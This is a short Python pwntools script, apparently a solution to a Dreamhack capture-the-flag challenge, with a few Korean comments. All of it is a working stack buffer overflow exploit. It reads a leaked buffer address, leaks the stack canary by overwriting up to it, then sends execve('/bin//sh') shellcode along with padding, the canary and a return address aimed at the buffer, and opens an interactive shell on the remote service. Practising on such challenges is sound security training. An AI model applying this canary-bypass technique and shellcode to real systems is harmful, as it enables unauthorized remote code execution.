from pwn import *

p = remote("host8.dreamhack.games", 22752)

p.recvuntil(b"Address of the buf: ")
addr = int(p.recvline().strip(), 16)
p.recvuntil(b"Distance between buf and $rbp: ")
pad = int(p.recvline().strip())

p.recvuntil("[1] Leak the canary")
p.sendlineafter(b'Input: ',b'A'* (pad-8))
p.recvuntil("Your input is '")
p.recvn(pad-8+1)

canary_raw = p.recvn(7)
canary = b'\x00'+ canary_raw
print(f'카나리 값 보기{hex(u64(canary))}')
p.recvuntil("[2] Overwrite the return address\nInput: ")

# 쉘코드
shellcode = b"\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05"
payload = shellcode
payload += b'A'* (pad-len(shellcode)-8)

# 24바이트 카나리 + SFP + RET
payload += canary
payload += b'B'*8
payload += p64(addr)

p.sendline(payload)

p.interactive()